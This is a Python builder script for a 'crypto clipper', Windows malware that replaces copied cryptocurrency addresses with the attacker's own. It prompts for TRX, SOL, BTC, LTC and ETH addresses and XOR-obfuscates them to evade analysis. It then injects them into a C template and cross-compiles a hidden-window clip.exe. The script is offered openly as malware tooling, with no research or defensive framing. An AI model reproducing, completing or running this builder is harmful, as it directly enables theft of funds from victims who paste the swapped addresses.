import re
import subprocess
import os

KEYS = {
    'trx': 0xA5,
    'sol': 0xBE,
    'btc': 0xC1,
    'ltc': 0xAB,
    'eth': 0xE7
}

def validate_address(wallet_type, address):
    if wallet_type == 'trx':
        return len(address) == 34 and address.startswith('T')
    elif wallet_type == 'sol':
        return len(address) == 44 and address.isalnum()
    elif wallet_type == 'btc':
        return address.startswith('bc1')
    elif wallet_type == 'ltc':
        return address.startswith('ltc1')
    elif wallet_type == 'eth':
        return len(address) == 42 and address.startswith('0x') and all(c in '0123456789abcdefABCDEF' for c in address[2:])
    return False

def obfuscate(wallet_type, address):
    key = KEYS[wallet_type]
    obf_bytes = [ord(c) ^ key for c in address]
    obf_bytes.append(0x00 ^ key)  # Null terminator
    return obf_bytes

def generate_c_array(name, bytes_list):
    hex_lines = []
    for i in range(0, len(bytes_list), 8):
        line = ", ".join(f"0x{b:02X}" for b in bytes_list[i:i+8])
        hex_lines.append(line)
    return f"char {name}[] = {{\n    " + ",\n    ".join(hex_lines) + "\n}};\n"

def main():
    with open("main.c", "r") as f:
        code = f.read()

    patterns = {
        'trx': r'char s_trx\[\] = \{.*?\}\};',
        'sol': r'char s_sol\[\] = \{.*?\}\};',
        'btc': r'char s_btc\[\] = \{.*?\}\};',
        'ltc': r'char s_ltc\[\] = \{.*?\}\};',
        'eth': r'char s_eth\[\] = \{.*?\}\};'
    }

    for wt in ['trx', 'sol', 'btc', 'ltc', 'eth']:
        while True:
            addr = input(f"Enter {wt.upper()} address: ").strip()
            if validate_address(wt, addr):
                break
            print(f"Invalid {wt.upper()} format!")

        obf_data = obfuscate(wt, addr)
        array_code = generate_c_array(f"s_{wt}", obf_data)
        code = re.sub(patterns[wt], array_code, code, flags=re.DOTALL)

    # Fix WinMain syntax
    code = code.replace("return 0;}}", "return 0;\n}")

    with open("temp_main.c", "w") as f:
        f.write(code)

    compile_cmd = [
        "x86_64-w64-mingw32-gcc",
        "-o", "clip.exe",
        "temp_main.c",
        "-luser32", "-ladvapi32", "-lshlwapi",
        "-mwindows", "-O2"
    ]
    
    result = subprocess.run(compile_cmd, stderr=subprocess.PIPE)
    if result.returncode == 0:
        print("\nSuccessfully compiled: clip.exe")
    else:
        print("\nCompilation failed!")
        print("Error details:")
        print(result.stderr.decode())

    os.remove("temp_main.c")

if __name__ == "__main__":
    print("Crypto Clipper Builder")
    print("Enter valid cryptocurrency addresses:")
    main()